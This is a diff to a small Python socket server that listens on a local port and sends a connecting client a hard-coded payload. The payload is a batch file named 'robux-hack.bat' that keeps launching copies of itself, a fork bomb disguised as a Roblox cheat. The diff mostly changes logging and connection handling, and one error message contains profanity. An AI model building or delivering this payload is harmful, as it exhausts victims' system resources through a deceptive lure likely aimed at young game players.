@@ -5,27 +5,33 @@ payload = b'@echo off\r\nstart robux-hack.bat\r\nstart robux-hack.bat\r\nstart r
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    s.bind(('127.0.0.1', 47024))
+    host = '127.0.0.1'
+    port = 47024
 
-    print('\nBound socket to port.\n')
+    s.bind((host, port))
 
-    print('\nListening for incoming connection...\n')
+    print('\n[] Bound socket to [%s: %s]\n' % (host, port))
+
+    print('\n[] Listening for incoming connection...\n')
 
     s.listen(1)
 
     conn, addr = s.accept()
     with conn:
+        print('[] Accepted connection from [%s: %s]' % (addr[0], addr[1]))
         try:
-            print('\nConnected by ', addr[0], addr[1], '\n')
+            print('\n[] Connected by ', addr[0], addr[1], '\n')
             conn.sendall(payload)
-            print('\nPayload sent.\n')
-            conn.close()
-            print('\nConnection closed.\n')
+            print('[] Payload sent.\n')
+            print(conn.recv(1024).decode('utf-8'))
+            
         except BrokenPipeError as e:
-            print('\nGot a broken pipe error.', e, '\n')
+            print('\n[ERROR] Got a broken pipe error.', e, '\n')
             conn.close()
-            print('\nConnection closed.\n')
+            print('\n[] Connection closed.\n')
 
+    conn.close()
+    print('[] Connection closed.\n')
     s.close()
 except OSError as e:
     print('Python being a bitch rn.', e)
